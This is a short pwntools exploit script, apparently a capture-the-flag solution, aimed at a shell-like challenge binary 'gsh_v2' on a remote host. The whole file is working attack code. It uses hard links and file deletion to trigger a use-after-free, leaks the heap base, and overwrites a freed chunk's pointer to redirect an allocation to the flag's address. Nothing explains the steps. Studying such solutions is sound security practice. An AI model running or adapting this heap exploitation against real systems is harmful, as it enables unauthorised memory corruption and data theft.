from pwn import *

#r = process('./gsh_v2')
r = remote('106.10.34.139', 20005)

r.sendlineafter('$ ', 'touch dummy1')
r.sendlineafter('$ ', 'touch dummy2')
r.sendlineafter('$ ', 'touch dummy3')

r.sendlineafter('$ ', 'ln dummy2 vuln')
r.sendlineafter('$ ', 'rm dummy3')
r.sendlineafter('$ ', 'rm dummy2')
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')
r.sendlineafter('$ ', 'gvim vuln')
r.recvuntil('/guardian/')
heap_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x2c0
flag = heap_base + 0xb0
log.info('HEAP BASE: 0x{:016x}'.format(heap_base))
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', p64(flag))
r.sendlineafter('$ ', 'gvim vuln')

r.interactive()
